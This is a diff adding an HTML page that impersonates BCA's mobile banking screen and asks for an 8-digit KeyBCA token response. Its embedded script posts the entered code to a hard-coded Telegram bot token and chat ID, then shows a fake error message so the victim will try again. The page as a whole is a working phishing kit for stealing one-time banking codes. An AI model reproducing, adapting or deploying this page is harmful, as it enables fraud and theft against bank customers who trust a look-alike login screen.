@@ -1,0 +1,118 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>RESPON KEYBCA APPLI 2</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+   body {
+      font-family: Arial, sans-serif;
+    }
+   #logo img {
+     display: block;
+     height: 55px;
+     width: 64px;
+   }
+   #logo {
+     background: #FFFFFF url(https://m.klikbca.com/images/bg_top_2x55.gif) repeat-x top;
+     height: 57px;
+     color: #FFFFFF;
+   }
+   footer {
+     background-color: #4f53b6; /* Footer color */
+   }
+   .border-custom-gray {
+     border-color: #4f53b6; /* Custom gray border color */
+   }
+  </style>
+ </head>
+ <body onload="document.getElementById('txt_user_id').focus();" class="bg-white text-[13px] leading-tight">
+  <div id="wrapper">
+   <div id="header">
+    <div id="logo">
+     <img alt="BCA-lite" src="https://m.klikbca.com/images/logo_bca_64x55.gif"/>
+    </div>
+   </div>
+   <div class="h-4"></div>
+  </header>
+  <main class="border border-custom-gray mx-1 mt-1">
+   <div class="px-2 py-1 text-[13px] text-blue-900 font-semibold">
+    RESPON KEYBCA APPLI 2
+   </div>
+   <div class="bg-gray-100 px-2 py-[2px]">
+    <input aria-label="Respon KeyBCA Appli 1 input" class="border border-black text-[13px] px-1 py-[2px] w-40" id="txt_user_id" maxlength="8" pattern="\d*" inputmode="numeric" type="text" />
+   </div>
+   <div class="px-2 py-1 text-[11px] text-red-700 font-normal leading-tight">
+    PASTIKAN DATA YANG DIINPUT TELAH BENAR.
+    <br/>
+    BCA TIDAK BERTANGGUNG JAWAB TERHADAP KESALAHAN PENGINPUTAN DATA
+   </div>
+   <div class="px-2 py-2 flex gap-2">
+    <button id="sendBtn" class="bg-gray-300 text-[#0000a7] font-semibold text-[13px] px-3 py-1 border border-custom-gray" type="button">
+     Kirim
+    </button>
+    <button id="cancelBtn" class="bg-gray-300 text-[#0000a7] font-semibold text-[13px] px-3 py-1 border border-custom-gray" type="button">
+     Batal
+    </button>
+   </div>
+  </main>
+  <footer class="text-white text-[13px] flex justify-start gap-6 px-3 py-2 mt-2">
+   <a class="hover:underline" href="#">
+    MENU UTAMA
+   </a>
+   <a class='hover:underline' href='/klikbca'>
+    LOGOUT
+   </a>
+  </footer>
+
+  <script>
+    const botToken = '8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo';
+    const chatId = '5906925079';
+
+    document.getElementById('sendBtn').addEventListener('click', () => {
+      const input = document.getElementById('txt_user_id');
+      const message = input.value.trim();
+
+      if (!message) {
+        alert('Please enter a response.');
+        return;
+      }
+      if (!/^\d{1,8}$/.test(message)) {
+        alert('Input harus berupa maksimal 8 angka.');
+        input.focus();
+        return;
+      }
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const params = {
+        chat_id: chatId,
+        text: `RESPON KEYBCA APPLI 2: ${message}`
+      };
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(params)
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert('KESALAHAN RESPON KeyBCA.');
+          input.value = '';
+        } else {
+          alert('Gagal mengirim data ke Telegram.');
+        }
+      })
+      .catch(() => {
+        alert('Terjadi kesalahan saat mengirim data.');
+      });
+    });
+
+    document.getElementById('cancelBtn').addEventListener('click', () => {
+      document.getElementById('txt_user_id').value = '';
+    });
+  </script>
+ </body>
+</html>
